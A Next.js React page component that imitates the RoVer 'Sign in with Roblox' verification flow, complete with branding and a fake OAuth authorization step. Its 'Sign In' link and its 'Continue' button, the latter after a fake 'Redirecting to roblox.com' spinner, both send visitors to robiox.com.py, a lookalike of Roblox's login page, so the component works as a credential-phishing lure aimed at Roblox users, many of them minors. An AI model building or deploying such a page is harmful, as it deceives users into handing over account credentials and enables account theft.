'use client'

import Link from 'next/link'
import { Button } from '@/components/ui/button'
import { useState } from 'react'

export default function RoVerVerify() {
  const [step, setStep] = useState('login')

  const handleContinue = () => {
    setStep('authorize')
  }

  return (
    <div className="min-h-screen bg-neutral-900 flex flex-col">
      {/* Header */}
      <header className="bg-pink-600 px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-2">
            <img src="/rover-logo.svg" alt="RoVer" className="w-8 h-8" style={{ filter: 'brightness(0) invert(1)' }} />
            <div className="text-white font-bold text-xl">RoVer</div>
          </div>
          
          <nav className="hidden md:flex items-center gap-8">
            <Link href="#" className="text-white hover:text-pink-100 transition text-sm">
              Help
            </Link>
            <Link href="#" className="text-white hover:text-pink-100 transition text-sm">
              Team Members
            </Link>
            <Link href="#" className="text-white hover:text-pink-100 transition border border-white rounded-md px-3 py-1.5 hover:bg-pink-700 text-sm">
              RoVer Plus
            </Link>
          </nav>

          <div className="flex items-center gap-3">
            <Button
              variant="outline"
              className="text-white border-white hover:bg-pink-700 text-sm"
            >
              Manage Servers
            </Button>
            <a 
              href="https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F227862234384%2Fprofile"
              target="_blank"
              rel="noopener noreferrer"
              className="bg-white text-pink-600 hover:bg-gray-100 text-sm font-semibold px-4 py-2 rounded"
            >
              Sign In
            </a>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4">
        {step === 'login' && (
          <div className="bg-black rounded-lg p-12 w-full max-w-md text-center">
            <h1 className="text-4xl font-bold text-white mb-4">
              Sign in to RoVer
            </h1>
            <p className="text-gray-300 mb-8">
              You must be 13 years of age or older to continue.
            </p>
            <button 
              onClick={() => setStep('authorize')}
              className="bg-pink-600 hover:bg-pink-700 text-white font-bold py-3 px-8 rounded-full transition w-full"
            >
              Log in with Roblox
            </button>
          </div>
        )}

        {step === 'authorize' && (
          <div className="bg-black rounded-lg p-12 w-full max-w-md text-center">
            <h1 className="text-4xl font-bold text-white mb-8">
              Sign in to RoVer
            </h1>
            
            <div className="mb-8 text-left">
              <h3 className="text-white font-bold text-2xl mb-4">ROBLOX</h3>
            </div>

            <h2 className="text-white text-xl font-semibold mb-6">
              Authorize with Roblox OAuth
            </h2>

            <div className="border-t border-gray-700 mb-8"></div>

            <div className="flex flex-col items-center gap-6 mb-8">
              <div className="flex flex-col items-center gap-2">
                <img src="/rover-logo.svg" alt="RoVer" className="w-20 h-20" />
                <p className="text-gray-400 text-sm">RoVer</p>
              </div>
            </div>

            <button 
              onClick={() => {
                setStep('success')
                setTimeout(() => {
                  window.location.href = 'https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F227862234384%2Fprofile'
                }, 2000)
              }}
              className="bg-white text-black font-bold py-3 px-8 rounded-lg w-full mb-4 hover:bg-gray-200 transition"
            >
              Continue
            </button>

            <p className="text-gray-500 text-sm mb-4">or</p>

            <button 
              onClick={() => setStep('login')}
              className="border border-gray-600 text-white font-semibold py-3 px-8 rounded-lg w-full hover:border-gray-400 transition"
            >
              Return to RoVer
            </button>
          </div>
        )}

        {step === 'success' && (
          <div className="bg-black rounded-lg p-12 w-full max-w-md text-center">
            <h1 className="text-4xl font-bold text-white mb-8">
              Sign in to RoVer
            </h1>
            
            <div className="mb-8 text-left">
              <h3 className="text-white font-bold text-2xl mb-4">ROBLOX</h3>
            </div>

            <h2 className="text-white text-xl font-semibold mb-6">
              Redirecting to roblox.com
            </h2>

            <div className="border-t border-gray-700 mb-8"></div>

            <div className="flex flex-col items-center gap-6 mb-8">
              <div className="w-12 h-12 border-4 border-gray-600 border-t-pink-600 rounded-full animate-spin"></div>
            </div>

            <p className="text-gray-400 text-sm">
              If you are not redirected back in a few seconds,{' '}
              <button 
                onClick={() => setStep('authorize')}
                className="text-blue-400 hover:underline"
              >
                cancel
              </button>
              {' '}and try again.
            </p>
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="bg-neutral-900 border-t border-neutral-800 px-6 py-12">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
            <div>
              <div className="text-pink-600 font-bold text-lg mb-2">
                Imaginary Menagerie
              </div>
              <p className="text-gray-400 text-sm">
                © 2026 Imaginary Menagerie, LLC.
              </p>
            </div>
            
            <div className="text-gray-400 text-sm space-y-2">
              <p><Link href="#" className="hover:text-pink-600 transition">Team members</Link></p>
              <p><Link href="#" className="hover:text-pink-600 transition">Support Discord server</Link></p>
              <p><Link href="#" className="hover:text-pink-600 transition">Add RoVer to your server</Link></p>
            </div>

            <div className="text-gray-400 text-sm space-y-2">
              <p><Link href="#" className="hover:text-pink-600 transition">Terms of Service</Link></p>
              <p><Link href="#" className="hover:text-pink-600 transition">Privacy Policy</Link></p>
              <p><Link href="#" className="hover:text-pink-600 transition">Verify your Roblox account</Link></p>
            </div>
          </div>

          <div className="text-gray-500 text-xs text-center">
            <Link href="#" className="hover:text-pink-600 transition">
              attributions
            </Link>
          </div>
        </div>
      </footer>
    </div>
  )
}
